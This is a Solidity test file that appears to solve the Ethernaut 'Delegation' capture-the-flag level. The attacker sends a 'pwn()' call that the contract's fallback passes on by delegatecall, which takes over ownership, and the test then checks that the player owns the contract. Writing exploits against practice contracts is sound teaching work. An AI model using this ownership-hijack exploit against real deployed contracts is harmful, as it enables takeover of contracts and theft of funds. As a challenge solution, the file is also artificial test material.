// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Delegation.sol";
import "../Attack.sol";

contract DelegationAttack is Attack {
   Delegation private _delegation;

    function setUp() public {
      vm.prank(owner);
      _delegation = new Delegation(address(new Delegate(makeAddr("delegate"))));
    }

    function test_attack() public {
      vm.startPrank(attacker);

      (bool success, bytes memory result) = address(_delegation).call(abi.encodeWithSignature("pwn()"));
      require(success, string(result));

      /*** Validation ***/
      assertFinished(address(_delegation));
    }

  function validateInstance(address payable _instance, address _player) override public view returns (bool) {
    Delegation parity = Delegation(_instance);
    return parity.owner() == _player;
  }
}
